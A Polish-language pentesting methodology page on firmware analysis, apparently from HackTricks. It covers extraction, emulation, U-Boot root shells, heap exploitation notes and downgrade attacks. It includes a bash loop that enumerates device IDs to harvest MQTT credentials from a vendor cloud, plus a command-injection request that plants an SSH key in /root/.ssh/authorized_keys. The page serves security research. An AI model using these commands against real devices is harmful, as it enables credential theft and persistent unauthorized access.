# Analiza firmware'u

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Wprowadzenie**

### Powiązane materiały

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware to niezbędne oprogramowanie, które umożliwia prawidłowe działanie urządzeń, zarządzając komunikacją między komponentami sprzętowymi a oprogramowaniem, z którym użytkownicy wchodzą w interakcję, i ułatwiając ją. Jest przechowywane w pamięci trwałej, dzięki czemu urządzenie może korzystać z kluczowych instrukcji od chwili włączenia, co prowadzi do uruchomienia systemu operacyjnego. Analiza firmware'u i jego ewentualna modyfikacja to kluczowy etap wykrywania luk w zabezpieczeniach.<sup>[[2]](#references)[[3]](#references)</sup>

## **Zbieranie informacji**

**Zbieranie informacji** to kluczowy pierwszy krok w poznaniu budowy urządzenia i wykorzystywanych przez nie technologii. Proces ten obejmuje gromadzenie danych na temat:

- Architektury CPU i uruchamianego systemu operacyjnego
- Szczegółów dotyczących bootloadera
- Układu sprzętowego i kart katalogowych
- Metryk bazy kodu i lokalizacji źródeł
- Bibliotek zewnętrznych i typów licencji
- Historii aktualizacji i certyfikatów zgodności z przepisami
- Diagramów architektury i przepływu
- Ocen bezpieczeństwa i wykrytych luk

W tym celu nieocenione są narzędzia **open-source intelligence (OSINT)**, podobnie jak analiza dostępnych komponentów oprogramowania open source za pomocą ręcznych i zautomatyzowanych procesów przeglądu. Narzędzia takie jak [Coverity Scan](https://scan.coverity.com) i [LGTM firmy Semmle](https://lgtm.com/#explore) oferują bezpłatną analizę statyczną, którą można wykorzystać do wykrywania potencjalnych problemów.

## **Pozyskiwanie firmware'u**

Firmware można pozyskać na różne sposoby, z których każdy wiąże się z innym poziomem złożoności:

- Bezpośrednio ze źródła (od deweloperów, producentów)
- Zbudowanie go na podstawie dostarczonych instrukcji
- Pobranie z oficjalnych stron pomocy technicznej
- Wykorzystanie zapytań **Google dork** do znalezienia hostowanych plików firmware'u
- Bezpośredni dostęp do **cloud storage** za pomocą narzędzi takich jak [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Przechwycenie **aktualizacji** za pomocą technik man-in-the-middle
- **Wyodrębnienie** z urządzenia przez interfejsy takie jak **UART**, **JTAG** lub **PICit**
- **Przechwytywanie** żądań aktualizacji w komunikacji urządzenia
- Identyfikacja i wykorzystanie **zakodowanych na stałe endpointów aktualizacji**
- **Zrzucenie** z bootloadera lub sieci
- **Wyjęcie i odczytanie** układu pamięci, gdy inne metody zawiodą, przy użyciu odpowiednich narzędzi sprzętowych

### Logi wyłącznie przez UART: wymuś root shell za pomocą środowiska U-Boot w pamięci flash

Jeśli dane RX UART są ignorowane (dostępne są tylko logi), nadal można wymusić powłokę init, **edytując offline blob środowiska U-Boot**:<sup>[[6]](#references)</sup>

1. Zrzuć zawartość pamięci SPI flash za pomocą klipsa SOIC-8 i programatora (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Znajdź partycję env U-Boot, edytuj `bootargs`, dodając `init=/bin/sh`, i **ponownie oblicz CRC32 env U-Boot** dla blobu.
3. Zapisz ponownie tylko partycję env i uruchom ponownie urządzenie; na UART powinien pojawić się shell.

Jest to przydatne w urządzeniach wbudowanych, w których shell bootloadera jest wyłączony, ale partycję env można zapisywać przez zewnętrzny dostęp do pamięci flash.

## Analiza firmware

Skoro **masz już firmware**, musisz wyodrębnić z niego informacje, aby wiedzieć, jak z nim postępować. Możesz do tego użyć różnych narzędzi:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Jeśli za pomocą tych narzędzi nie znajdziesz zbyt wiele, sprawdź **entropię** obrazu poleceniem `binwalk -E <bin>`. Niska entropia oznacza, że obraz prawdopodobnie nie jest zaszyfrowany. Wysoka entropia oznacza, że prawdopodobnie jest zaszyfrowany (lub w jakiś sposób skompresowany).

Możesz też użyć tych narzędzi, aby wyodrębnić **pliki osadzone w firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Możesz też użyć [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)), aby sprawdzić plik.

### Pobieranie systemu plików

Za pomocą wcześniej omówionych narzędzi, takich jak `binwalk -ev <bin>`, powinno się udać **wyodrębnić system plików**.\
Binwalk zazwyczaj wyodrębnia go do **folderu o nazwie określającej typ systemu plików**, który zwykle należy do jednego z następujących typów: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ręczne wyodrębnianie systemu plików

Czasami binwalk **nie ma bajtu magicznego systemu plików w swoich sygnaturach**. W takich przypadkach użyj binwalk, aby **znaleźć przesunięcie systemu plików i wyciąć skompresowany system plików** z pliku binarnego, a następnie **ręcznie wyodrębnić** system plików zgodnie z jego typem, wykonując poniższe kroki.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Uruchom następujące **polecenie dd**, aby wyodrębnić system plików Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatywnie można uruchomić następujące polecenie.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Dla squashfs (używanego w powyższym przykładzie)

`$ unsquashfs dir.squashfs`

Pliki znajdą się później w katalogu "`squashfs-root`".

- Pliki archiwów CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Dla systemów plików jffs2

`$ jefferson rootfsfile.jffs2`

- Dla systemów plików ubifs z pamięcią NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiza firmware

Po uzyskaniu firmware należy go dokładnie przeanalizować, aby zrozumieć jego strukturę i potencjalne podatności. Proces ten obejmuje użycie różnych narzędzi do analizy i wyodrębnienia cennych danych z obrazu firmware.

### Narzędzia do wstępnej analizy

Poniżej przedstawiono zestaw poleceń do wstępnej inspekcji pliku binarnego (określanego jako `<bin>`). Polecenia te pomagają zidentyfikować typy plików, wyodrębnić ciągi znaków, analizować dane binarne oraz poznać szczegóły dotyczące partycji i systemu plików:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Aby ocenić stan szyfrowania obrazu, sprawdza się jego **entropię** za pomocą `binwalk -E <bin>`. Niska entropia sugeruje brak szyfrowania, a wysoka może wskazywać na szyfrowanie lub kompresję.

Do **wyodrębniania osadzonych plików** zalecane są narzędzia i zasoby, takie jak dokumentacja **file-data-carving-recovery-tools** oraz **binvis.io** do inspekcji plików.

### Wyodrębnianie systemu plików

Polecenie `binwalk -ev <bin>` zwykle pozwala wyodrębnić system plików, często do katalogu o nazwie odpowiadającej jego typowi (np. squashfs, ubifs). Jeśli jednak **binwalk** nie rozpoznaje typu systemu plików z powodu braku bajtów magicznych, konieczne jest ręczne wyodrębnienie. W tym celu za pomocą `binwalk` lokalizuje się offset systemu plików, a następnie poleceniem `dd` wyodrębnia jego zawartość:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Następnie, w zależności od typu systemu plików (np. squashfs, cpio, jffs2, ubifs), do ręcznego wyodrębnienia zawartości używa się różnych poleceń.

### Analiza systemu plików

Po wyodrębnieniu systemu plików rozpoczyna się poszukiwanie luk w zabezpieczeniach. Zwraca się uwagę na niezabezpieczone demony sieciowe, dane uwierzytelniające zapisane na stałe, punkty końcowe API, funkcje serwera aktualizacji, nieskompilowany kod, skrypty startowe oraz skompilowane pliki binarne przeznaczone do analizy offline.

**Kluczowe lokalizacje** i **elementy** do sprawdzenia obejmują:

- **etc/shadow** i **etc/passwd** w poszukiwaniu danych uwierzytelniających użytkowników
- Certyfikaty i klucze SSL w **etc/ssl**
- Pliki konfiguracyjne i skrypty pod kątem potencjalnych luk
- Wbudowane pliki binarne do dalszej analizy
- Typowe serwery WWW i pliki binarne urządzeń IoT

W wykrywaniu poufnych informacji i luk w systemie plików pomagają różne narzędzia:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) do wyszukiwania poufnych informacji
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) do kompleksowej analizy firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) do analizy statycznej i dynamicznej

### Kontrole bezpieczeństwa skompilowanych plików binarnych

Zarówno kod źródłowy, jak i skompilowane pliki binarne znalezione w systemie plików należy dokładnie sprawdzić pod kątem luk. Narzędzia takie jak **checksec.sh** dla plików binarnych Unix i **PESecurity** dla plików binarnych Windows pomagają wykryć niezabezpieczone pliki, które można wykorzystać.

## Pozyskiwanie konfiguracji chmurowej i danych uwierzytelniających MQTT za pomocą tokenów URL wyprowadzanych z danych urządzenia

Wiele hubów IoT pobiera konfigurację dla danego urządzenia z punktu końcowego w chmurze, którego adres ma postać:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Podczas analizy firmware możesz odkryć, że `<token>` jest lokalnie wyprowadzany z identyfikatora urządzenia przy użyciu sekretu zapisanego na stałe, na przykład:

- token = MD5( deviceId || STATIC_KEY ) i jest przedstawiany jako wielkie litery w zapisie szesnastkowym

Taka konstrukcja pozwala każdemu, kto pozna deviceId i STATIC_KEY, odtworzyć URL i pobrać konfigurację z chmury, często ujawniając jawne dane uwierzytelniające MQTT i prefiksy tematów.

Praktyczny przebieg działań:

1) Wyodrębnij deviceId z logów rozruchowych UART

- Podłącz adapter UART 3,3 V (TX/RX/GND) i przechwyć logi:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Poszukaj wierszy wyświetlających wzorzec adresu URL konfiguracji chmury i adres brokera, na przykład:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Odzyskaj STATIC_KEY i algorytm tokenu z firmware

- Załaduj pliki binarne do Ghidra/radare2 i wyszukaj ścieżkę konfiguracji ("/pf/") lub użycie MD5.
- Potwierdź algorytm (np. MD5(deviceId||STATIC_KEY)).
- Wyprowadź token w Bash i zamień skrót na wielkie litery:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Pozyskaj konfigurację chmurową i dane uwierzytelniające MQTT

- Złóż URL i pobierz JSON za pomocą curl; przetwórz go za pomocą jq, aby wyodrębnić sekrety:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Wykorzystaj MQTT przesyłające dane jawnym tekstem i słabe ACL-e tematów (jeśli występują)

- Użyj odzyskanych poświadczeń, aby zasubskrybować tematy związane z konserwacją i wyszukać poufne zdarzenia:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Wyliczanie przewidywalnych identyfikatorów urządzeń (na dużą skalę, za zgodą)

- Wiele ekosystemów osadza bajty OUI/produktu/typu dostawcy, po których następuje sekwencyjny sufiks.
- Możesz iterować po potencjalnych identyfikatorach, programowo generować tokeny i pobierać konfiguracje:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notatki
- Zawsze uzyskaj wyraźną zgodę przed podjęciem prób masowej enumeracji.
- Jeśli to możliwe, preferuj emulację lub analizę statyczną, aby odzyskać sekrety bez modyfikowania sprzętu docelowego.


Proces emulacji firmware umożliwia **analizę dynamiczną** działania urządzenia lub pojedynczego programu. To podejście może napotkać problemy związane z zależnościami od sprzętu lub architektury, ale przeniesienie głównego systemu plików lub określonych plików binarnych na urządzenie o zgodnej architekturze i kolejności bajtów, takie jak Raspberry Pi, lub do gotowej maszyny wirtualnej może ułatwić dalsze testy.

### Emulowanie pojedynczych plików binarnych

Podczas badania pojedynczych programów kluczowe jest ustalenie kolejności bajtów i architektury procesora programu.

#### Przykład z architekturą MIPS

Aby emulować plik binarny dla architektury MIPS, można użyć polecenia:

```bash
file ./squashfs-root/bin/busybox
```

Aby zainstalować niezbędne narzędzia do emulacji:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

W przypadku MIPS (big-endian) używa się `qemu-mips`, a w przypadku binariów little-endian — `qemu-mipsel`.

#### Emulacja architektury ARM

W przypadku binariów ARM proces jest podobny — do emulacji używa się emulatora `qemu-arm`.

### Emulacja całego systemu

Narzędzia takie jak [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i inne umożliwiają emulację całego firmware’u, automatyzując ten proces i wspomagając analizę dynamiczną.

## Analiza dynamiczna w praktyce

Na tym etapie do analizy wykorzystuje się rzeczywiste lub emulowane środowisko urządzenia. Niezbędne jest zachowanie dostępu do powłoki systemu operacyjnego i systemu plików. Emulacja może nie odzwierciedlać wiernie interakcji ze sprzętem, dlatego czasami trzeba ją ponownie uruchomić. Analiza powinna obejmować ponowne sprawdzenie systemu plików, wykorzystanie podatności w udostępnionych stronach WWW i usługach sieciowych oraz poszukiwanie podatności w bootloaderze. Testy integralności firmware’u mają kluczowe znaczenie dla wykrywania potencjalnych podatności związanych z backdoorami.

## Techniki analizy w czasie działania

Analiza w czasie działania polega na interakcji z procesem lub binarium w jego środowisku operacyjnym. Wykorzystuje się do tego narzędzia takie jak gdb-multiarch, Frida i Ghidra, aby ustawiać punkty przerwania oraz wykrywać podatności za pomocą fuzzingu i innych technik.

W przypadku celów wbudowanych, które nie mają pełnego debuggera, **skopiuj na urządzenie statycznie linkowany `gdbserver` i podłącz się zdalnie**:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapowanie komunikatów Zigbee / koprocesora radiowego

W hubach IoT stos RF jest często podzielony między **MCU radiowe** a proces działający w przestrzeni użytkownika systemu Linux. Przydatny schemat pracy polega na prześledzeniu ścieżki:<sup>[[8]](#references)</sup>

1. **Ramka RF** przesyłana drogą radiową
2. **Parser po stronie kontrolera** w MCU radiowym
3. **Tekstowy protokół szeregowy/UART lub TLV** przekazywany do systemu Linux (na przykład `/dev/tty*`)
4. **Dispatcher aplikacji** w głównym demonie
5. **Handler / maszyna stanów** specyficzne dla protokołu

Ta architektura daje dwa cele do analizy wstecznej zamiast jednego. Jeśli kontroler konwertuje binarne ramki radiowe na protokół tekstowy, taki jak `Group,Command,arg1,arg2,...`, ustal:

- **Grupy komunikatów** i tabele dispatchera
- Które komunikaty mogą pochodzić z **sieci**, a które od samego kontrolera
- Dokładne **pola rozróżniające specyficzne dla producenta** (na przykład Zigbee `manufacturer_code` i niestandardowe `cluster_command`)
- Które handlery są osiągalne tylko podczas **commissioning**, wykrywania lub pobierania firmware’u/modelu

W przypadku Zigbee przechwyć ruch podczas parowania i sprawdź, czy urządzenie nadal korzysta z domyślnego **Link Key** `ZigBeeAlliance09`. Jeśli tak, podsłuch ruchu podczas commissioning może ujawnić **Network Key**. Kody instalacyjne Zigbee 3.0 ograniczają to ryzyko, dlatego sprawdź, czy testowane urządzenie rzeczywiście wymusza ich użycie.

### Handlery protokołów specyficznych dla producenta i osiągalność ograniczona przez FSM

Niestandardowe komendy Zigbee/ZCL są często lepszym celem niż standardowe klastry, ponieważ trafiają do **własnego kodu parsującego** i wewnętrznych **maszyn stanów (FSM)**, których walidacja jest słabiej sprawdzona.<sup>[[8]](#references)</sup>

Praktyczny schemat pracy:

- Analizuj wstecz dispatcher komend, aż znajdziesz **handler dostępny wyłącznie dla producenta**.
- Odtwórz tabele **stanu FSM**, **zdarzeń**, **warunków**, **akcji** i **następnego stanu**.
- Zidentyfikuj **stany przejściowe**, które przechodzą dalej automatycznie, oraz gałęzie ponowień/błędów, które ostatecznie resetują lub zwalniają kontrolowany przez atakującego stan.
- Ustal, jakie prawidłowe wymiany protokołu są potrzebne, aby wprowadzić demona w podatny stan — nie zakładaj, że wadliwy handler jest zawsze osiągalny.

W przypadku protokołów wrażliwych na opóźnienia odtwarzanie pakietów z frameworka Python może być zbyt wolne. Pewniejszym podejściem jest emulowanie prawidłowego urządzenia na rzeczywistym sprzęcie (na przykład **nRF52840**) z użyciem stosu klasy komercyjnej, aby udostępnić właściwe **endpointy**, **atrybuty** i synchronizację commissioning.

### Klasa błędów związanych z fragmentowanym pobieraniem wbudowanych demonów

Powtarzająca się klasa błędów firmware’u występuje podczas **fragmentowanego pobierania blobów/modeli/konfiguracji**:<sup>[[8]](#references)</sup>

1. **Pierwszy fragment** (`offset == 0`) zapisuje `ctx->total_size` i alokuje `malloc(total_size)`.
2. Kolejne fragmenty sprawdzają tylko kontrolowane przez atakującego pola **lokalne dla pakietu**, takie jak `packet_total_size >= offset + chunk_len`.
3. Kopiowanie używa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez sprawdzenia względem **pierwotnego rozmiaru alokacji**.

Atakujący może wówczas wysłać:

- Prawidłowy pierwszy fragment z **małym** zadeklarowanym rozmiarem całkowitym, aby wymusić małą alokację na stercie.
- Późniejszy fragment z **oczekiwanym offsetem**, ale większym `chunk_len`.
- Sfałszowany lokalny rozmiar pakietu, który przechodzi nowe kontrole, a mimo to powoduje przepełnienie pierwotnie zaalokowanego bufora.

Jeśli podatna ścieżka jest dostępna dopiero po przejściu logiki commissioning, wykorzystanie błędu musi obejmować wystarczającą **emulację urządzenia**, aby wprowadzić cel w oczekiwany stan pobierania modelu lub blobu przed wysłaniem wadliwych fragmentów.

### Wyzwalanie `free()` przez protokół

Wbudowanych demonach najłatwiej wyzwolić wykorzystanie metadanych sterty nie przez „czekanie na sprzątanie”, lecz przez **wymuszenie obsługi błędów samego protokołu**:<sup>[[8]](#references)</sup>

- Wyślij wadliwe kolejne fragmenty, aby wprowadzić FSM w stany **ponawiania** lub **błędu**.
- Przekrocz limit ponowień, aby demon **zresetował kontekst** i zwolnił uszkodzony bufor.
- Wykorzystaj to przewidywalne `free()`, aby uruchomić prymitywy po stronie alokatora, zanim proces ulegnie awarii z innych przyczyn.

Jest to szczególnie przydatne w przypadku alokatorów podobnych do **musl/uClibc/dlmalloc** w wbudowanym systemie Linux, gdzie uszkodzenie metadanych chunków może zamienić logikę unlink/unbin w prymityw zapisu. Stabilnym podejściem jest uszkodzenie **pola size**, aby skierować przechodzenie alokatora do **fałszywych chunków umieszczonych w przepełnionym buforze**, zamiast od razu nadpisywać rzeczywiste wskaźniki binów i powodować awarię procesu.

## Eksploatacja binarna i Proof-of-Concept

Tworzenie PoC dla zidentyfikowanych podatności wymaga dogłębnego zrozumienia architektury celu i programowania w językach niskiego poziomu. Zabezpieczenia środowiska uruchomieniowego binariów są rzadkie w systemach wbudowanych, ale gdy występują, konieczne mogą być techniki takie jak Return Oriented Programming (ROP).

### Uwagi dotyczące fastbin exploitation w uClibc (wbudowany Linux)

- **Fastbins i konsolidacja:** uClibc używa fastbinów podobnych do tych w glibc. Późniejsza duża alokacja może wywołać `__malloc_consolidate()`, dlatego każdy fałszywy chunk musi przejść kontrole (prawidłowy rozmiar, `fd = 0` i sąsiednie chunki uznawane za „zajęte”).<sup>[[6]](#references)</sup>
- **Binariów non-PIE przy ASLR:** jeśli ASLR jest włączone, ale główny plik binarny jest **non-PIE**, adresy `.data/.bss` wewnątrz binarium są stabilne. Można wskazać obszar, który już przypomina prawidłowy nagłówek chunka sterty, aby skierować alokację fastbin na **tablicę wskaźników do funkcji**.
- **NUL zatrzymujący parser:** podczas parsowania JSON znak `\x00` w payloadzie może zatrzymać parsowanie, pozostawiając końcowe bajty kontrolowane przez atakującego do wykonania stack pivot/łańcucha ROP.
- **Shellcode przez `/proc/self/mem`:** łańcuch ROP wywołujący `open("/proc/self/mem")`, `lseek()` i `write()` może umieścić wykonywalny shellcode w znanym mapowaniu i przekazać do niego sterowanie.

## Przygotowane systemy operacyjne do analizy firmware’u

Systemy operacyjne takie jak [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) oferują wstępnie skonfigurowane środowiska do testowania bezpieczeństwa firmware’u, wyposażone w niezbędne narzędzia.

## Przygotowane systemy operacyjne do analizy firmware’u

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS to dystrybucja przeznaczona do przeprowadzania oceny bezpieczeństwa i testów penetracyjnych urządzeń Internetu rzeczy (IoT). Oszczędza dużo czasu, zapewniając wstępnie skonfigurowane środowisko z załadowanymi wszystkimi niezbędnymi narzędziami.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): system operacyjny do testowania bezpieczeństwa systemów wbudowanych, oparty na Ubuntu 18.04 i wyposażony w narzędzia do testowania bezpieczeństwa firmware’u.

## Ataki downgrade’u firmware’u i niezabezpieczone mechanizmy aktualizacji

Nawet jeśli producent wdroży kryptograficzne sprawdzanie podpisów obrazów firmware’u, **ochrona przed przywróceniem starszej wersji (downgrade’em) jest często pomijana**. Jeśli bootloader lub loader odzyskiwania weryfikuje jedynie podpis przy użyciu osadzonego klucza publicznego, ale nie sprawdza *wersji* (ani licznika monotonicznego) wgrywanego obrazu, atakujący może legalnie zainstalować **starszy, podatny firmware z nadal prawidłowym podpisem**, przywracając w ten sposób załatane podatności.<sup>[[4]](#references)</sup>

Typowy przebieg ataku:

1. **Zdobądź starszy, podpisany obraz**
   * Pobierz go z publicznego portalu pobierania producenta, CDN-u lub strony pomocy technicznej.
   * Wyodrębnij go z powiązanych aplikacji mobilnych/desktopowych (np. z katalogu `assets/firmware/` w pliku APK Androida).
   * Pobierz go z repozytoriów zewnętrznych, takich jak VirusTotal, archiwa internetowe, fora itp.
2. **Prześlij obraz na urządzenie lub udostępnij go urządzeniu** za pośrednictwem dostępnego kanału aktualizacji:
   * Interfejs WWW, API aplikacji mobilnej, USB, TFTP, MQTT itp.
   * Wiele konsumenckich urządzeń IoT udostępnia nieuwierzytelnione endpointy HTTP(S), które przyjmują zakodowane w Base64 bloby firmware’u, dekodują je po stronie serwera i uruchamiają procedurę odzyskiwania/aktualizacji.
3. Po downgrade’zie wykorzystaj podatność załataną w nowszym wydaniu (na przykład filtr command injection dodany później).
4. Opcjonalnie wgraj z powrotem najnowszy obraz lub wyłącz aktualizacje, aby uniknąć wykrycia po uzyskaniu persistence.

### Przykład: Command Injection po downgrade’zie

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

W podatnym (obniżonym do starszej wersji) firmware parametr `md5` jest bezpośrednio doklejany do polecenia powłoki bez oczyszczania, co umożliwia wstrzykiwanie dowolnych poleceń (w tym przypadku — uzyskanie dostępu root za pomocą klucza SSH). W późniejszych wersjach firmware wprowadzono podstawowy filtr znaków, ale brak ochrony przed obniżeniem wersji sprawia, że poprawka jest nieskuteczna.<sup>[[4]](#references)</sup>

### Wyodrębnianie firmware z aplikacji mobilnych

Wielu dostawców dołącza pełne obrazy firmware do aplikacji mobilnych, aby aplikacja mogła aktualizować urządzenie przez Bluetooth/Wi-Fi. Takie pakiety są zwykle przechowywane bez szyfrowania w APK/APEX, w ścieżkach takich jak `assets/fw/` lub `res/raw/`. Narzędzia takie jak `apktool`, `ghidra`, a nawet zwykłe `unzip` pozwalają pobrać podpisane obrazy bez dostępu do fizycznego sprzętu.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Obejście ochrony przed downgrade’em wyłącznie w updaterze w układach z slotami A/B

Niektórzy dostawcy implementują **ratchet** chroniący przed downgrade’em, ale tylko w logice *updatera* (na przykład w procedurze UDS przez CAN, komendzie recovery lub agencie OTA w userspace). Jeśli **bootloader** później sprawdza wyłącznie podpis/CRC obrazu i ufa tablicy partycji lub metadanym slotu, nadal można obejść ochronę przed rollbackiem.<sup>[[7]](#references)</sup>

Typowy słaby projekt:

- Metadane firmware zawierają zarówno deskryptor wersji, jak i **ratchet bezpieczeństwa** / licznik monotoniczny.
- Updater porównuje ratchet obrazu z wartością zapisaną w pamięci trwałej i odrzuca starsze, podpisane obrazy.
- Bootloader **nie** analizuje ratchetu i przed uruchomieniem wybranego slotu weryfikuje tylko nagłówek, CRC i podpis.
- Aktywacja slotu jest zapisywana osobno w tablicy partycji lub liczniku generacji dla danego slotu i **nie jest kryptograficznie powiązana** z dokładnym skrótem zatwierdzonego firmware.

W systemach z dwoma slotami tworzy to prymityw **zweryfikuj jeden obraz / uruchom inny obraz**. Jeśli atakujący może sprawić, że updater oznaczy slot B jako następny cel rozruchu przy użyciu aktualnego, podpisanego obrazu, a następnie nadpisać slot B przed ponownym uruchomieniem, bootloader może mimo to uruchomić starszy obraz, ponieważ ufa tylko wcześniej zatwierdzonym metadanym slotu.

Typowy schemat nadużycia:

1. Wgraj **aktualny, podpisany** firmware do nieaktywnego slotu i uruchom standardową procedurę weryfikacji/przełączenia, aby układ oznaczył ten slot jako następny aktywny.
2. **Nie uruchamiaj jeszcze ponownie urządzenia**. W tej samej sesji ponownie wywołaj procedurę przygotowania/kasowania slotu.
3. Wykorzystaj nieaktualny stan rozruchu lub logikę wyboru slotu, aby updater skasował **ten sam fizyczny slot**, który właśnie został aktywowany.
4. Zapisz w tym slocie **starszy, ale nadal podpisany** firmware.
5. Pomiń procedurę weryfikacji, która egzekwuje ratchet, i uruchom urządzenie ponownie bezpośrednio.
6. Bootloader wybiera aktywowany slot, weryfikuje tylko podpis/integralność i uruchamia stary obraz.

Na co zwrócić uwagę podczas analizy wstecznej implementacji aktualizacji A/B:

- Wybór slotu na podstawie **flag odczytywanych podczas rozruchu**, które nie są odświeżane po pomyślnym przełączeniu.
- Procedura w stylu `prepare_passive_slot()`, która kasuje slot na podstawie nieaktualnego stanu zamiast **aktualnego, zatwierdzonego układu**.
- Funkcja w stylu `part_write_layout()`, która jedynie zwiększa **licznik generacji** / ustawia flagę aktywności, ale nie zapisuje skrótu zatwierdzonego obrazu.
- Sprawdzanie ratchetu zaimplementowane w userspace lub kodzie updatera, ale **nie** w ROM-ie / bootloaderze / etapach secure boot.
- Procedury kasowania lub recovery, które pozostawiają slot oznaczony jako rozruchowy nawet po usunięciu i ponownym zapisaniu jego zawartości.

### Lista kontrolna do oceny logiki aktualizacji

* Czy transport i uwierzytelnianie *endpointu aktualizacji* są odpowiednio zabezpieczone (TLS + uwierzytelnianie)?
* Czy urządzenie porównuje **numery wersji** lub **monotoniczny licznik chroniący przed rollbackiem** przed flashowaniem?
* Czy obraz jest weryfikowany w ramach łańcucha secure boot (np. podpisy sprawdza kod ROM)?
* Czy **bootloader egzekwuje ten sam ratchet** co updater, zamiast sprawdzać tylko podpis/CRC?
* Czy metadane aktywacji slotu są **powiązane z zatwierdzonym skrótem/wersją firmware**, czy też slot można zmodyfikować po jego aktywowaniu?
* Czy po pomyślnym przełączeniu slotu urządzenie musi się ponownie uruchomić, czy też w tej samej sesji nadal można wywołać kolejne procedury aktualizacji/kasowania?
* Czy kod userlandu wykonuje dodatkowe kontrole poprawności (np. dozwolonej mapy partycji, numeru modelu)?
